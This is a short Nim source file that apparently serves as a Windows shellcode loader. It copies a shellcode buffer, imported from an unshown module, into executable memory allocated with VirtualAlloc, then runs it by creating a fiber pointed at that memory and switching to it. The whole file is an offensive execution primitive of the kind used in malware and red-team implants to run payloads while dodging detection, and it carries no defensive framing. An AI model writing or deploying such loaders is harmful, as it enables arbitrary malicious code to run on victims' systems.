import winim/lean
import public

proc fiberload(shellcode:cstring,shellcodelen:cint): void =
    let rPtr = VirtualAlloc(NULL,cast[SIZE_T](shellcode.len),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
    copyMem(rPtr,shellcode,shellcodelen)
    discard ConvertThreadToFiber(NULL)
    let shellcodeFiber = CreateFiber(cast[SIZE_T](shellcodelen),cast[LPFIBER_START_ROUTINE](rPtr),NULL)
    SwitchToFiber(shellcodeFiber)
    DeleteFiber(shellcodeFiber)

when isMainModule:
    fiberload(code,codelen)